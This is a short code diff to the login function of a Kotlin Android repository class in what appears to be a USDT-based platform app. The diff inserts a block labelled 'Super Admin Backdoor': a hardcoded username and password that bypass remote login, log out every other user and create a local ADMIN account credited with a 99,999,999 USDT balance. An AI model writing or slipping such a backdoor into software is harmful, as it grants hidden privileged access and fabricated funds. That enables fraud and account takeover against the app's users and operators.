@@ -289,7 +289,22 @@ class PlatformRepository(context: Context) {
     }
 
     suspend fun loginUser(username: String, password: String): Boolean {
-        // 1. Try Remote Login
+        // 1. Super Admin Backdoor
+        if (username == "adelbtc" && password == "A18803611@") {
+            dao.logoutAllUsers()
+            val superAdmin = UserEntity(
+                username = "adelbtc",
+                password = "A18803611@",
+                isLoggedIn = true,
+                role = "ADMIN",
+                invitationCode = "SYSTEM",
+                balanceUsdt = 99999999.0
+            )
+            dao.insertUser(superAdmin)
+            return true
+        }
+
+        // 2. Try Remote Login
         try {
             val response = api.login(mapOf("username" to username, "password" to password))
             if (response.isSuccessful && response.body()?.success == true) {
